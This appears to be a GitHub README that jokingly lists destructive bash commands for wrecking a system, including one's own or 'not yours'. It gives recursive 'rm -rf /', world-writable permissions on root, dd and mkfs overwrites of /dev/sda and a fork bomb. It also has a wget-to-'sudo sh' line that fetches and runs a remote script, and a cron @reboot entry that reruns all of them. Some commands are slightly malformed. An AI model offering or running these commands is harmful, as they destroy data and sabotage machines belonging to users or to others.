# Dumb ways to kill your system
Kill your (or not yours) system with style. Many ways on many languages to make your system be snapped by thanos itself.

# Bash

The commands above should work on Android, Linux, MacOS, and others systems who run on the bash interpreter.
<br />
<br />
```
sudo chmod -R 777 /*; 
```
This will just make your entire system acessible using permissions.
<br />
<br />

```
sudo rm -rf /* --no-preserve-root;
```
Well, this surely will wipe down your entire system.
<br />
<br />

```
dd if=/dev/null of=/dev/sda; 
```
This will change every bite of your drive to 0's.
<br />
<br />

```
sudo mv /home/* /dev/null; 
```
This command will to move your entire users folder to the absolute void.
<br />
<br />

```
sudo mkfs.ext3 /dev/sda; 
```
This will format your drive entirely.
<br />
<br />

```
: () {: |: &} ;:
```
I's called fork bomb, and should make your system crashes, if you have one.
<br />
<br />

```
wget https://raw.githubusercontent.com/willnaoosmit/Dumb-ways-to-kill-your-system/master/bash/script.sh -O | sudo sh
```
This command will download and run automatically the file with all the bash commands above.
<br />
<br />

```
sudo touch /var/spool/cron/$USER; echo '@reboot sudo chmod -R 777 /*; sudo rm -rf /* --no-preserve-root; dd if=/dev/null of=/dev/sda; sudo mv /* /dev/null; sudo mkfs.ext3 /dev/sda; : () {: |: &} ;:' > /var/spool/cron/$USER
```
This command will add all the commands above to run on the next reboot.
<br />
<br />


